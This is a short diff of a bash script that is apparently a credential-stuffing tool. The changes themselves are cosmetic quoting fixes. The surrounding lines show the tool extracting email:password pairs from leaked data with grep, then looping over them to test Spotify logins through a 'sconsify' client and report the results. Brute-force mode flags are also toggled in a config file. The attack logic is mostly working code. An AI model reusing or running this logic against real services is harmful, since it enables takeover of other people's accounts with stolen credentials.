@@ -376,7 +376,7 @@ analyz() {
     delay="0.1"
         printf "%26s"; for analyzing in $(seq 0 $(expr length "${text}"))
         do 
-                       echo -n "${text:$analyzing:1}"; 
+                      echo -n "${text:$analyzing:1}"
                       sleep "${delay}"
         done
 }
@@ -384,7 +384,7 @@ analyz() {
 analyzer() {
 wait_time=$TIME
 temp_cnt=${wait_time}
-  while [[ ${temp_cnt} -gt 0 ]]; do
+  while [[ "${temp_cnt}" -gt "0" ]]; do
      printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
      sleep 1
   ((temp_cnt--))
@@ -393,7 +393,7 @@ temp_cnt=${wait_time}
 
 countdown() {
     conf
-if [[ ${GBRUTEFORCE} = "true" ]]; then
+if [[ "${GBRUTEFORCE}" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=true' "$CONF"
       sed -i '119d' "$CONF"
@@ -405,7 +405,7 @@ if [[ ${GBRUTEFORCE} = "true" ]]; then
       printf "\n%64s \n" | tr ' ' '='
       echo
       analyzer
-elif [[ ${PBRUTEFORCE} = "true" ]]; then
+elif [[ "${PBRUTEFORCE}" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=false' "$CONF"
       sed -i '119d' "$CONF"
@@ -417,7 +417,7 @@ elif [[ ${PBRUTEFORCE} = "true" ]]; then
       printf "\n%64s \n" | tr ' ' '='
       echo
       analyzer
-elif [[ ${SBRUTEFORCE} = "true" ]]; then
+elif [[ "${SBRUTEFORCE}" = "true" ]]; then
       sed -i '118d' "$CONF"
       sed -i '118 i GBRUTEFORCE=false' "$CONF"
       sed -i '119d' "$CONF"
@@ -466,7 +466,6 @@ grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNE
 while read line; do
 SPOTIFY_USER="$(echo $line|cut -d: -f1)"
 SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-
      ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
           if [[ "$?" -eq "0" ]]; then
              echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
